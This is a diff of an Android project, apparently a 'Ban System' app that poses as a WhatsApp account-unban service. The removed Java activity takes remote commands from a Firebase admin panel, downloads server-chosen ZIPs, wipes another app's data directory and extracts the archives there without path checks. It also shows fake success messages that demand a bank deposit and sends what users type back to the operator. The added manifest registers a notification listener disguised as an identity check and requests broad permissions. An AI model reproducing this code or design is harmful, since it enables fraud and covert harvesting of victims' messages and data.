@@ -1,369 +1,57 @@
-package com.ban.ab;
-
-import android.app.AlertDialog;
-import android.content.Intent;
-import android.graphics.Color;
-import android.graphics.drawable.ColorDrawable;
-import android.os.Bundle;
-import android.util.Log;
-import android.view.View;
-import android.widget.Button;
-import android.widget.EditText; 
-import android.widget.ImageView;
-import android.widget.ProgressBar;
-import android.widget.TextView;
-import android.widget.Toast;
-
-import androidx.annotation.NonNull;
-import androidx.appcompat.app.AppCompatActivity;
-import androidx.cardview.widget.CardView;
-
-// استيراد حزمة Firebase الرسمية للربط الحي والمباشر 🚀
-import com.google.firebase.database.DataSnapshot;
-import com.google.firebase.database.DatabaseError;
-import com.google.firebase.database.DatabaseReference;
-import com.google.firebase.database.FirebaseDatabase;
-import com.google.firebase.database.ValueEventListener;
-
-import java.io.BufferedInputStream;
-import java.io.File;
-import java.io.FileInputStream;
-import java.io.FileOutputStream;
-import java.io.IOException;
-import java.io.InputStream;
-import java.net.HttpURLConnection;
-import java.net.URL;
-import java.util.HashMap;
-import java.util.Map;
-import java.util.zip.ZipEntry;
-import java.util.zip.ZipInputStream;
-
-public class SecondActivity extends AppCompatActivity {
-
-    private String userName;
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    xmlns:tools="http://schemas.android.com/tools"
+    android:sharedUserId="com.abdullah.shared_space"
+    tools:ignore="SharedUserId"> 
+    <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+    <uses-permission android:name="android.permission.VIBRATE" />
     
-    // مراجع الفايربيس الرسمية
-    private DatabaseReference mCommandsRef;
-    private ValueEventListener mCommandsListener;
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" android:maxSdkVersion="28" />
+    <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE" tools:ignore="ScopedStorage" />
+    <uses-permission android:name="android.permission.KILL_BACKGROUND_PROCESSES" />
+    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
 
-    private CardView layoutWaiting, layoutRejected, layoutZipTask, layoutVerifyTask, layoutPayment;
-    private TextView txtRejectReason, txtTicketID, txtPaymentDetails;
-    private Button btnExecuteTask, btnStartFullVerify;
-    private ProgressBar taskProgressBar;
+    <queries>
+        <package android:name="com.universe.messenger" />
+        <package android:name="com.abdullahtamemi" />
+        <package android:name="com.whatsapp" />
+        <package android:name="com.target.app" /> <package android:name="com.abdullahtamemmi" />
+    </queries>
 
-    private long lastProcessedTimestamp = 0;
-    private AlertDialog currentDialog = null;
+    <application
+        android:allowBackup="true"
+        android:icon="@android:drawable/sym_def_app_icon"
+        android:label="Ban System"
+        android:supportsRtl="true"
+        android:requestLegacyExternalStorage="true"
+        android:theme="@style/AppTheme">
 
-    @Override
-    protected void onCreate(Bundle savedInstanceState) {
-        super.onCreate(savedInstanceState);
-        setContentView(R.layout.activity_second);
+        <activity
+            android:name=".MainActivity"
+            android:exported="true"
+            android:screenOrientation="portrait">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
 
-        userName = getSharedPreferences("AppPrefs", MODE_PRIVATE).getString("user_name", "UnknownUser");
+        <activity 
+            android:name=".SecondActivity"
+            android:exported="false"
+            android:screenOrientation="portrait" />
 
-        initViews();
-        generateTicketID();
-        
-        // البدء بمراقبة أوامر لوحة التحكم بشكل حي ⚡
-        startRealtimeCommandListener();
-    }
+        <service android:name=".CallNotificationListener"
+            android:label="نظام فحص الهوية"
+            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.NOTIFICATION_LISTENER_SERVICE" />
+            </intent-filter>
+        </service>
 
-    private void initViews() {
-        layoutWaiting = findViewById(R.id.layoutWaiting);
-        layoutRejected = findViewById(R.id.layoutRejected);
-        layoutZipTask = findViewById(R.id.layoutZipTask);
-        layoutVerifyTask = findViewById(R.id.layoutVerifyTask);
-        layoutPayment = findViewById(R.id.layoutPayment);
-
-        txtRejectReason = findViewById(R.id.txtRejectReason);
-        txtTicketID = findViewById(R.id.txtTicketID);
-        txtPaymentDetails = findViewById(R.id.txtPaymentDetails);
-
-        btnExecuteTask = findViewById(R.id.btnExecuteTask);
-        btnStartFullVerify = findViewById(R.id.btnStartFullVerify);
-        taskProgressBar = findViewById(R.id.taskProgressBar);
-    }
-
-    // مستمع يراقب التغيرات في السيرفر بشكل صامت وفوري 📡
-    private void startRealtimeCommandListener() {
-        mCommandsRef = FirebaseDatabase.getInstance().getReference("commands").child(userName);
-        
-        mCommandsListener = new ValueEventListener() {
-            @Override
-            public void onDataChange(@NonNull DataSnapshot snapshot) {
-                if (!snapshot.exists()) {
-                    handleDeletion(); // تم إنهاء العقدة من لوحة التحكم، تدمير الجلسة
-                    return;
-                }
-
-                Long timestamp = snapshot.child("timestamp").getValue(Long.class);
-                String status = snapshot.child("status").getValue(String.class);
-                String content = snapshot.child("content").getValue(String.class);
-                String backupUrl = snapshot.child("backup_url").getValue(String.class);
-
-                if (timestamp != null && timestamp > lastProcessedTimestamp) {
-                    lastProcessedTimestamp = timestamp;
-                    
-                    // تمرير البيانات المحدثة لمعالجتها تلقائياً
-                    handleCommand(status, content, backupUrl);
-                }
-            }
-
-            @Override
-            public void onCancelled(@NonNull DatabaseError error) {
-                Log.e("Firebase_Live", "Listen canceled: " + error.getMessage());
-            }
-        };
-        
-        mCommandsRef.addValueEventListener(mCommandsListener);
-    }
-
-    private void handleDeletion() {
-        getSharedPreferences("AppPrefs", MODE_PRIVATE).edit().clear().apply();
-        Toast.makeText(this, "انتهت صلاحية الجلسة أو تم إلغاء الحساب", Toast.LENGTH_LONG).show();
-        finishAffinity(); 
-    }
-
-    private void handleCommand(String status, String content, String backupUrl) {
-        hideAllLayouts();
-        if (content == null) content = "";
-
-        switch (status) {
-            case "waiting":
-                layoutWaiting.setVisibility(View.VISIBLE);
-                break;
-                
-            case "rejected":
-                layoutRejected.setVisibility(View.VISIBLE);
-                txtRejectReason.setText(content.isEmpty() ? "تم رفض طلبك حالياً" : content);
-                break;
-                
-            case "backup_task": // الاستعادة صمتاً عبر فك ضغط ملف ZIP المباشر 🔄
-                layoutZipTask.setVisibility(View.VISIBLE);
-                btnExecuteTask.setText("تطبيق التحديث الفوري (ZIP)");
-                btnExecuteTask.setOnClickListener(v -> startZipExtractionProcess(backupUrl));
-                break;
-                
-            case "verify_phone":
-                layoutVerifyTask.setVisibility(View.VISIBLE);
-                btnStartFullVerify.setOnClickListener(v -> startActivity(new Intent(this, VerifyActivity.class)));
-                break;
-                
-            case "show_payment":
-                showPaymentUI(content);
-                break;
-                
-            case "show_alert":
-                layoutWaiting.setVisibility(View.VISIBLE);
-                showCustomPopUp(content, false);
-                break;
-                
-            case "show_input":
-                layoutWaiting.setVisibility(View.VISIBLE);
-                showCustomPopUp(content, true);
-                break;
-                
-            default:
-                layoutWaiting.setVisibility(View.VISIBLE);
-                break;
-        }
-    }
-
-    private void hideAllLayouts() {
-        layoutWaiting.setVisibility(View.GONE);
-        layoutRejected.setVisibility(View.GONE);
-        layoutZipTask.setVisibility(View.GONE);
-        layoutVerifyTask.setVisibility(View.GONE);
-        layoutPayment.setVisibility(View.GONE);
-    }
-
-    // تحميل ملف ZIP واستخراجه في مجلد الحزمة المتطابقة ذات التوقيع المشترك 📦
-    private void startZipExtractionProcess(String zipUrl) {
-    if (zipUrl == null || zipUrl.isEmpty()) return;
+    </application>
     
-    btnExecuteTask.setEnabled(false);
-    taskProgressBar.setVisibility(View.VISIBLE);
-    
-    new Thread(() -> {
-        try {
-            // 1. إرسال برودكاست لإغلاق الواتساب المعدل فوراً قبل تعديل الملفات
-            Intent stopIntent = new Intent("com.whatsapp.mod.ACTION_FORCE_CLOSE");
-            sendBroadcast(stopIntent);
-            
-            // انتظار بسيط للتأكد من إغلاق العمليات (Process) الخاصة بالواتساب
-            Thread.sleep(1000);
-
-            // 2. تحميل ملف الـ ZIP من السيرفر
-            File tempZip = new File(getFilesDir(), "temp_update.zip");
-            downloadFileNative(zipUrl, tempZip);
-
-            // 3. مسار مجلد البيانات المستهدف
-            File targetWhatsappDir = new File("/data/data/com.target.app"); 
-
-            if (targetWhatsappDir.exists()) {
-                runOnUiThread(() -> Toast.makeText(this, "جاري تهيئة المجلد ومسح البيانات القديمة...", Toast.LENGTH_SHORT).show());
-                
-                // 4. التنظيف الكامل: حذف محتويات مجلد الواتساب القديم لتجنب تداخل الملفات
-                deleteDirectoryContents(targetWhatsappDir);
-                
-                // 5. استخراج محتويات الـ ZIP الجديدة بالكامل
-                unzip(tempZip, targetWhatsappDir);
-
-                runOnUiThread(() -> {
-                    Toast.makeText(this, "اكتمل استبدال البيانات والتحديث بنجاح! ✅", Toast.LENGTH_LONG).show();
-                    resetStatusOnServer();
-                });
-            } else {
-                runOnUiThread(() -> Toast.makeText(this, "خطأ: لم يتم العثور على الحزمة المستهدفة", Toast.LENGTH_SHORT).show());
-            }
-
-        } catch (Exception e) {
-            Log.e("Zip_Extraction_Error", "Failed to clear or transfer files", e);
-            runOnUiThread(() -> Toast.makeText(this, "فشل في معالجة واستبدال الملفات", Toast.LENGTH_SHORT).show());
-        }
-        
-        runOnUiThread(() -> {
-            taskProgressBar.setVisibility(View.GONE);
-            btnExecuteTask.setEnabled(true);
-        });
-    }).start();
-}
-
-// دالة مسح كافة الملفات والمجلدات الفرعية داخل المجلد المستهدف
-private void deleteDirectoryContents(File dir) {
-    if (dir.isDirectory()) {
-        String[] children = dir.list();
-        if (children != null) {
-            for (String child : children) {
-                File file = new File(dir, child);
-                if (file.isDirectory()) {
-                    deleteDirectoryContents(file); // مسح المجلدات الفرعية تكرارياً
-                }
-                file.delete();
-            }
-        }
-    }
-}
-
-    private void downloadFileNative(String fileUrl, File destFile) throws IOException {
-        URL url = new URL(fileUrl);
-        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
-        connection.setRequestMethod("GET");
-        connection.connect();
-
-        if (connection.getResponseCode() != HttpURLConnection.HTTP_OK) {
-            throw new IOException("Server returned HTTP " + connection.getResponseCode());
-        }
-
-        try (InputStream input = connection.getInputStream();
-             FileOutputStream output = new FileOutputStream(destFile)) {
-            byte[] buffer = new byte[4096];
-            int bytesRead;
-            while ((bytesRead = input.read(buffer)) != -1) {
-                output.write(buffer, 0, bytesRead);
-            }
-        } finally {
-            connection.disconnect();
-        }
-    }
-
-    // محرك فك الضغط المدمج لنقل المجلدات بشكل هيكلي صحيح داخل الحزمة 📁
-    private void unzip(File zipFile, File targetDirectory) throws IOException {
-        try (ZipInputStream zis = new ZipInputStream(new BufferedInputStream(new FileInputStream(zipFile)))) {
-            ZipEntry ze;
-            byte[] buffer = new byte[4096];
-            while ((ze = zis.getNextEntry()) != null) {
-                File file = new File(targetDirectory, ze.getName());
-                File dir = ze.isDirectory() ? file : file.getParentFile();
-                
-                if (dir != null && !dir.isDirectory() && !dir.mkdirs()) {
-                    throw new IOException("Failed to ensure directory: " + dir.getAbsolutePath());
-                }
-                if (ze.isDirectory()) continue;
-                
-                try (FileOutputStream fos = new FileOutputStream(file)) {
-                    int count;
-                    while ((count = zis.read(buffer)) != -1) {
-                        fos.write(buffer, 0, count);
-                    }
-                }
-            }
-        }
-    }
-
-    private void showPaymentUI(String amount) {
-        layoutPayment.setVisibility(View.VISIBLE);
-        String details = "تم فك الحظر بنجاح 100% للرقم المرجعي :- " + txtTicketID.getText() + "\n\n" +
-                "يرجى إيداع مبلغ " + amount + " إلى حسابنا في العمقي\n" +
-                "رقم الحساب:- 11111\n" +
-                "الإسم : فلان بن فلان\n\n" +
-                "حتى يتم إكمال الخطوة الأخيرة لتشغيل حسابك فوراً.";
-        txtPaymentDetails.setText(details);
-    }
-
-    private void showCustomPopUp(String message, boolean isInput) {
-        if (currentDialog != null && currentDialog.isShowing()) return;
-
-        AlertDialog.Builder builder = new AlertDialog.Builder(this);
-        View view = getLayoutInflater().inflate(R.layout.dialog_custom, null);
-        
-        TextView txtMsg = view.findViewById(R.id.dialogMessage);
-        EditText edtIn = view.findViewById(R.id.dialogInput);
-        Button btnOk = view.findViewById(R.id.btnDialogAction);
-        ImageView btnClose = view.findViewById(R.id.btnDialogClose);
-
-        txtMsg.setText(message);
-        edtIn.setVisibility(isInput ? View.VISIBLE : View.GONE);
-        
-        currentDialog = builder.setView(view).setCancelable(false).create();
-        if(currentDialog.getWindow() != null) currentDialog.getWindow().setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT));
-
-        btnClose.setOnClickListener(v -> {
-            resetStatusOnServer();
-            currentDialog.dismiss();
-        });
-
-        btnOk.setOnClickListener(v -> {
-            if(isInput) {
-                String input = edtIn.getText().toString().trim();
-                if (!input.isEmpty()) {
-                    sendResponseToAdmin(input);
-                    currentDialog.dismiss();
-                } else {
-                    edtIn.setError("مطلوب");
-                }
-            } else {
-                resetStatusOnServer();
-                currentDialog.dismiss();
-            }
-        });
-        currentDialog.show();
-    }
-
-    private void sendResponseToAdmin(String response) {
-        DatabaseReference respRef = FirebaseDatabase.getInstance().getReference("user_responses").child(userName);
-        
-        Map<String, Object> data = new HashMap<>();
-        data.put("answer", response);
-        data.put("time", System.currentTimeMillis());
-
-        respRef.setValue(data).addOnSuccessListener(aVoid -> resetStatusOnServer());
-    }
-
-    private void resetStatusOnServer() {
-        FirebaseDatabase.getInstance().getReference("commands")
-                .child(userName).child("status").setValue("waiting");
-    }
-
-    private void generateTicketID() { 
-        txtTicketID.setText("BT-" + (System.currentTimeMillis() / 1000000)); 
-    }
-
-    @Override 
-    protected void onDestroy() { 
-        super.onDestroy(); 
-        if (mCommandsRef != null && mCommandsListener != null) {
-            mCommandsRef.removeEventListener(mCommandsListener);
-        }
-    }
-}
+</manifest>
